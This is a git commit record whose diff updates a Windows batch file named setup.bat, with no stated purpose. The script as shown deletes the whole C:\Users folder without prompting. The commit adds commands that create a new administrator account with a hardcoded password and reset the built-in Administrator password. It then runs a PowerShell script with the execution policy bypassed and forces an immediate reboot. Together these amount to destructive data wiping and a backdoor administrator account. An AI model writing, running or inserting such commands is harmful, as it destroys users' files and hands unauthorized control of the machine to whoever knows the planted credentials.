d6aad76cf80218e6ec763b8015af115097c7965b
cs947939 <sufam5@outlook.com>
2023-11-09 15:44:53 -0600

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,4 +1,8 @@
 @echo off
 uwfmgr filter enable
 RD C:\Users /S /Q
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\setup" /v CmdLine /d /f /t REG_DWORD
+net user UWF-Admin Admin1234!@munchy /add
+net localgroup Administrators UWF-Admin /add
+net user Administrator ueww1234munchy111
+Powershell -ExecutionPolicy Bypass -File "C:\undosetup.ps1"
+shutdown -r -f -t 0
